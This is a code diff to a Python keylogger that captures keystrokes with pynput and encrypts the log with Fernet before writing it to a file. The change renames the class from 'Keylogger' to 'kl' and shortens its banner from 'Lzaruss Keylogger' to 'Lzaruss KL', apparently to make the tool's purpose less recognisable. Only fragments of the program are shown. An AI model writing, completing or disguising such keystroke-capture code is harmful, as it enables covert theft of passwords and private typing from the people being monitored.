@@ -1,9 +1,9 @@
 from pynput import keyboard
 from cryptography.fernet import Fernet
 
-class Keylogger:
+class kl:
     def __init__(self):
-        self.head = 'Lzaruss Keylogger:\n'
+        self.head = 'Lzaruss KL:\n'
         self.log = ''
         self.cifrado = None
 
@@ -34,7 +34,6 @@ class Keylogger:
             f.write(self.head+"\n"+(cypherS))
 
     def start(self):
-
         clave = Fernet.generate_key()
         self.cifrado = Fernet(clave)
         passw = clave.decode('utf-8')
@@ -46,4 +45,4 @@ class Keylogger:
         listener = keyboard.Listener()
         listener.start()
 
-Keylogger().start()
+kl().start()
